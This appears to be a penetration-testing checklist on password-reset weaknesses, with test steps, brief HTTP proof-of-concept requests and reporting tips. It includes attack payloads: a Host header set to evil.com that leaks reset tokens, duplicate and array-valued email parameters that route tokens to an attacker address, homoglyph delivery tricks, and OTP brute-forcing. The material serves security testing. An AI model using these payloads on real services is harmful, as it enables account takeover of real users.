# Password Reset Flaws

**What it is:** Weaknesses in the forgot-password flow → hijack the reset → account takeover.

## Test steps
- [ ] **Host header poisoning**: `Host:`/`X-Forwarded-Host: evil.com` → reset link in email points to attacker → victim clicks → token to you.
- [ ] Token leaks in `Referer` when the reset page loads third-party resources.
- [ ] Weak token: predictable, sequential, short, timestamp-based, no expiry, reusable.
- [ ] Token not tied to user → use your token to reset victim's account.
- [ ] Reset via response manipulation (`"success":true`), or skip the token step.
- [ ] Change `email`/`user_id` param in the reset request (send victim's reset to control it).
- [ ] Add second `email` param (HPP): `email=victim&email=attacker` → token to attacker.
- [ ] OTP-based reset: brute the code (no rate limit), race the attempt counter.
- [ ] Old password/session still valid after reset (no session invalidation).
- [ ] Reset link works multiple times / after use.
- [ ] IDOR on "set new password" endpoint (supply victim id).

## Impact
Account takeover (often mass, if token predictable).

## 🎯 PoC — Request → Response

**Host-header poisoning (reset link built from `Host`):**
```http
POST /api/v1/auth/forgot-password HTTP/2
Host: evil.com
Content-Type: application/json

{"email":"victim@corp.com"}
```
```http
HTTP/2 200 OK
{"message":"reset email sent"}
```
Email delivered to the victim contains:
```
https://evil.com/reset-password?token=eyJ0eXAi...aB9
```
Victim clicks → token hits attacker's server → account takeover.

**HPP variant — second email param captures the token:**
```http
POST /api/v1/auth/forgot-password HTTP/2
Host: api.target.com
Content-Type: application/json

{"email":"victim@corp.com","email":"attacker@evil.com"}
```
```http
HTTP/2 200 OK
{"message":"reset email sent"}      ← token delivered to attacker@evil.com
```

## Deep cuts — reset-flow attacks past host-header + HPP
- [ ] **Token-leak channels:** `Referer` to third-party scripts/analytics/CDNs on the reset page; token in the `Location`/history; token echoed in a page/API response; token in the password-reset *confirmation* email to the wrong address.
- [ ] **Array / nested recipient (JSON):** `{"email":["victim@x","attacker@y"]}`, `{"email":{"$ne":null}}`, or `{"email":"victim@x","username":"attacker"}` — parser sends to attacker while logging victim (`08-json-auth-fuzzing`).
- [ ] **Unicode / alias delivery trick:** `victim@x.com` vs `victim@x.com` (homoglyph domain you own), `victim+@x.com`, `"victim@x.com"@evil.com`, RTL/zero-width to route delivery (`09-advanced/04`).
- [ ] **Token predictability audit:** UUIDv1 (time+MAC), sequential/DB-id, `md5(email)`, `base64(email|timestamp)`, short numeric OTP → forge/brute. Capture 50+ tokens → Burp Sequencer entropy.
- [ ] **Token not single-use / no expiry / no invalidation** on new request → reuse an old link; requesting a new token doesn't kill the old one.
- [ ] **Cross-account binding:** your valid token accepted to set *another* user's password (IDOR on `user_id`/`email` in the set-password step); or a token issued for account A resets account B.
- [ ] **OTP-reset brute + race:** unthrottled 4-6 digit code, parallel-guess to beat the counter (`02-business-logic/07`).
- [ ] **State desync:** old sessions survive the reset; reset succeeds on suspended/unverified accounts, reactivating + taking them over (`09-advanced/10`).
- [ ] **Deep-link / mobile reset:** the `myapp://reset?token=` handler skips checks the web flow enforces, or leaks the token to any app registering the scheme (`05-client-side/05`).
- [ ] **Reset-to-known-value / no-token path:** a "set password" endpoint reachable with just a session/email, skipping the emailed token entirely.

## Report notes
Show the hijacked reset ending in you controlling a victim account you set up. For host-header, show the poisoned link in the received email. Name the exact defect (poisoning / HPP / token-predictability / cross-account IDOR).
